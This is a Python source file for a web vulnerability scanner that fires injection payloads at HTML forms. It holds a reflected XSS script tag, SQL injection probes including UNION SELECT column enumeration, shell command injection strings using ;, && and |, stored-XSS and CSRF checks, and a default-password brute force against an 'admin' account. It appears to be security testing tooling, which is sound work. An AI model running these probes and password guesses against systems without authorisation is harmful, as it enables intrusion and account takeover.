import requests
from urllib.parse import urljoin

def submit_form(form_details, url, payload):
    
    # where the form data should be sent
    target_url = urljoin(url, form_details["action"])

    inputs = form_details["inputs"]

    # iterate through each input field and store data that will be injected
    data = {}
    for input_tag in inputs:
        if input_tag["type"] == "text" or input_tag["type"] == "search" or input_tag["type"] == "password":
            data[input_tag["name"]] = payload
    
    if form_details["method"] == "post":

        # send data to URL form and return server response
        return requests.post(target_url, data=data)
    else:

        # send data to URL form and return server response
        return requests.get(target_url, params=data)

def scan_xss(form_details):
    source_url = form_details["source_url"]
    print("Scanning form for XSS at: " + str(source_url))
    
    xss_payload = "<script>alert('JavaScript code executed successfully')</script>"
    
    # submit form with XSS payload
    response = submit_form(form_details, source_url, xss_payload)
    
    # Check if the payload is reflected in the response
    if xss_payload in response.text:
        print("XSS Vulnerability discovered in form at: " + str(source_url))
        print("Form details: " + str(form_details))

def scan_error_based_SQLi(form_details):

    # Error-based SQL injection

    source_url = form_details["source_url"]
    print("Scanning form for SQLi at: " + str(source_url))
    
    # A single quote can be used to test for SQLi
    sqli_payload = "'"
    
    # Submit the form with the SQLi payload
    response = submit_form(form_details, source_url, sqli_payload)
    
    # List of common database error messages
    db_errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "syntax error"
    ]
    
    # Check the response for any of the error messages
    for error in db_errors:
        if error in response.text.lower():
            print("Error-based SQL Injection Vulnerability discovered in form at: " + str(source_url))
            print("Form details: " + str(form_details))
            # Once an error is found, we don't need to check for others
            break

def scan_boolean_SQLi(form_details):
    
    # Boolean-Based Blind SQL Injection

    source_url = form_details["source_url"]
    print("Scanning form for SQLi at: " + str(source_url))
    
    # Payload for a TRUE condition
    payload_true = "' OR 1=1--"
    
    # Payload for a FALSE condition
    payload_false = "' AND 1=0--"
    
    # Response for the TRUE payload
    response_true = submit_form(form_details, source_url, payload_true)
    
    # Response for the FALSE payload
    response_false = submit_form(form_details, source_url, payload_false)
    
    # Compare the length of the responses
    if len(response_true.content) != len(response_false.content):
        print("Blind SQL Injection Vulnerability discovered in form at: " + str(source_url))
        print("Form details: " + str(form_details))

def scan_union_sqli(form_details):
    
    # Union-based SQL injection

    source_url = form_details["source_url"]
    print("Scanning form for Union-based SQL injection at: " + str(source_url))

    # Establish the baseline of a normal failed response
    baseline_payload = "generic_safe_input"

    try:
        # Baseline response for a normal failure
        response_baseline = submit_form(form_details, source_url, baseline_payload)

        # Determine number of columns
        column_count = 0

        # Test up to 30 columns
        for i in range(1, 31):
            null_payload = ", ".join(["NULL"] * i)
            payload = f"' UNION SELECT {null_payload}--"
            
            response_test = submit_form(form_details, source_url, payload)

            # If the response is the same length as our baseline, the syntax error is gone, meaning we found the correct number of columns
            if len(response_test.content) == len(response_baseline.content):
                column_count = i
                print("Inferred column count: " + str(column_count))
                break

        if (column_count == 0):
            return None
    
        # Identify which columns are displayed on the page
        displayed_columns = []

        # Create a list of unique string markers to inject
        markers = [f"'col_{j}'" for j in range(column_count)]
        marker_payload = f"' UNION SELECT {', '.join(markers)}--"
        
        response_markers = submit_form(form_details, source_url, marker_payload)
        
        # Check if the markers exists anywhere in the webpage's text
        for j in range(column_count):
            if f"col_{j}" in response_markers.text:
                displayed_columns.append(j)
        
        if not displayed_columns:
            return None

        return {"column_count": column_count, "displayed_columns": displayed_columns}

    except requests.exceptions.RequestException:
        return None
    
def scan_command_injection(form_details):
    
    target_url = form_details["action"]
    print(f"Scanning form for Command Injection at: {target_url}")
    
    # Payloads that attempt to echo a unique string
    # We test different operators: ; (semicolon), && (AND), | (PIPE)
    payloads = [
        "; echo 'VULN_CMD_INJ'", 
        "&& echo 'VULN_CMD_INJ'", 
        "| echo 'VULN_CMD_INJ'"
    ]
    
    for payload in payloads:
        # Test the payload in every input field
        for input_tag in form_details["inputs"]:
            if input_tag["type"] in ["text", "search"]:
                
                # Submit the form with the payload
                response = submit_form(form_details, form_details["source_url"], payload)
                
                if "VULN_CMD_INJ" in response.text:
                    print(f"Command Injection Detected!")
                    print(f"Payload: {payload}")
                    print(f"Input Field: {input_tag['name']}")
                    return True
    return False

def scan_stored_xss(form_details):
    
    print(f"Scanning form for Stored XSS")
    
    # A safe string to see if input is stored
    probe_string = "XSS-STORED-TEST-PROBE"
    
    # Submit the probe
    submit_form(form_details, form_details["source_url"], probe_string)
    
    # Check page to see if it was stored
    try:
        from session_manager import session
        reload_response = session.get(form_details["source_url"])
        
        if probe_string in reload_response.text:
            print(f"Potential Stored XSS: Input was saved to the page.")
            print(f"Manual verification required: Check if <script> tags are sanitized.")
            return True
            
    except Exception as e:
        print(f"Error reloading page for Stored XSS check: {e}")
    
    return False

def scan_brute_force(form_details, password_list=["password", "123456", "admin"]):

    # Check if this is actually a login form (has a password input)
    password_input = None
    username_input = None
    
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "password":
            password_input = input_tag
        if input_tag["type"] == "text" and "user" in input_tag.get("name", "").lower():
            username_input = input_tag

    if not password_input:
        return False

    print(f"Scanning form for Weak Passwords (Brute Force)...")
    
    target_url = form_details["action"]
    
    # Try a specific username
    target_user = "admin"
    
    for password in password_list:
        # Construct specific payload dictionary manually to control user/pass fields
        data = {}
        # Fill in hidden fields/submit buttons based on form_details
        for input_tag in form_details["inputs"]:
            if input_tag["type"] == "hidden" or input_tag["type"] == "submit":
                data[input_tag["name"]] = input_tag.get("value", "")
        
        # Set the username and password
        data[username_input["name"]] = target_user
        data[password_input["name"]] = password
        
        # Send Request
        # Need to handle GET vs POST
        from session_manager import session
        if form_details["method"] == "post":
            res = session.post(target_url, data=data)
        else:
            res = session.get(target_url, params=data)
            
        # Check success
        if "Welcome" in res.text and "login.php" not in res.url:
            print(f"Brute Force SUCCESS: Username: {target_user} | Password: {password}")
            return True
            
    return False

def scan_csrf(form_details):

    # List of common names for CSRF tokens
    csrf_token_names = ["csrf", "token", "csrf_token", "user_token", "authenticity_token"]
    
    has_token = False
    
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "hidden":
            if any(name in input_tag["name"].lower() for name in csrf_token_names):
                has_token = True
    
    if not has_token:
        print(f"Potential CSRF Vulnerability: Form at {form_details['action']} has no Anti-CSRF token.")
        return True
        
    return False